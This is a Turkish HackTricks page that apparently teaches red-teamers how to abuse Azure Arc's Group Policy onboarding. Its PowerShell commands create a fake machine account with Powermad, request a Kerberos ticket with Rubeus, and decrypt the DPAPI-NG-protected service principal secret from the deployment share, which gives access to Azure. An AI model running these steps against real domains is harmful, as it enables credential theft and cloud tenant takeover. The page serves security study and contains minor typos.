# Az - Azure Arc Hassas GPO Dağıtma Betiği

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

### Sorunları Tanımlama

Azure Arc, yeni iç sunucuların (katılmış etki alanı sunucuları) Azure Arc'a Grup İlke Nesnesi yöntemiyle entegrasyonuna olanak tanır. Bu işlemi kolaylaştırmak için Microsoft, başlatma işlemi için gerekli dağıtım araçlarını sağlar. ArcEnableServerGroupPolicy.zip dosyası içinde DeployGPO.ps1, EnableAzureArc.ps1 ve AzureArcDeployment.psm1 betikleri bulunabilir.

Çalıştırıldığında, DeployGPO.ps1 betiği aşağıdaki işlemleri gerçekleştirir:

1. Yerel etki alanında Azure Arc Sunucuları Katılma GPO'sunu oluşturur.
2. Onboarding işlemi için oluşturulan belirli ağ paylaşımına EnableAzureArc.ps1 başlatma betiğini ve Windows yükleyici paketini kopyalar.

Bu betiği çalıştırırken sistem yöneticilerinin **ServicePrincipalId** ve **ServicePrincipalClientSecret** olmak üzere iki ana parametreyi sağlamaları gerekir. Ayrıca, etki alanı, paylaşımı barındıran sunucunun FQDN'si ve paylaşım adı gibi diğer parametreler de gereklidir. Kiracı kimliği, kaynak grubu ve diğer gerekli bilgiler de betiğe sağlanmalıdır.

DPAPI-NG şifrelemesi kullanılarak belirtilen paylaşımdaki AzureArcDeploy dizininde şifrelenmiş bir gizli oluşturulur. Şifrelenmiş gizli, encryptedServicePrincipalSecret adlı bir dosyada saklanır. Bu şifrelemenin, DeployGPO.ps1 betiğinde gerçekleştirildiği kanıtlanabilir. Şifreleme, $descriptor ve $ServicePrincipalSecret değişkenleriyle ProtectBase64'ü çağırarak gerçekleştirilir. Açıklamada belirtildiği gibi, descriptor, Domain Computer ve Domain Controller grup SIDs'ini içerir ve ServicePrincipalSecret'in yalnızca Etki Alanı Denetleyicileri ve Etki Alanı Bilgisayarları güvenlik grupları tarafından şifresinin çözülebileceğini sağlar.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Sömürü

Aşağıdaki koşullara sahibiz:

1. İç ağı başarılı bir şekilde ele geçirdik.
2. Active Directory içinde bir bilgisayar hesabı oluşturma veya kontrolünü ele geçirme yeteneğine sahibiz.
3. AzureArcDeploy dizinini içeren bir ağ paylaşımı keşfettik.

Bir AD ortamında bir makine hesabı elde etmenin birkaç yöntemi vardır. En yaygın olanlardan biri makine hesabı kotasını sömürmektir. Başka bir yöntem ise zayıf ACL'ler veya çeşitli diğer yapılandırmalar aracılığıyla bir makine hesabını tehlikeye atmak olabilir.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Bir makine hesabı elde edildikten sonra bu hesap kullanılarak kimlik doğrulaması yapmak mümkündür. Ya runas.exe komutunu netonly bayrağı ile kullanabiliriz ya da Rubeus.exe ile bilet geçirme yöntemini kullanabiliriz.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Bilgisayar hesabımız için TGT'nin bellekte saklanmasıyla, aşağıdaki betiği kullanarak hizmet başkanı sırrını şifreleyebiliriz.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternatif olarak, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG) kullanabiliriz.

Bu noktada, Azure'a bağlanmak için gerekli kalan bilgileri toplayabiliriz. Bu bilgiler, şifrelenmiş Service Principal Secret dosyasıyla aynı ağ paylaşımında bulunan ArcInfo.json dosyasında saklanmaktadır. Bu dosya, TenantId, servicePrincipalClientId, ResourceGroup ve daha fazlası gibi detayları içerir. Bu bilgilerle, etkilenmiş servis prensibi olarak kimlik doğrulaması yapmak için Azure CLI kullanabiliriz.

## Referanslar

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
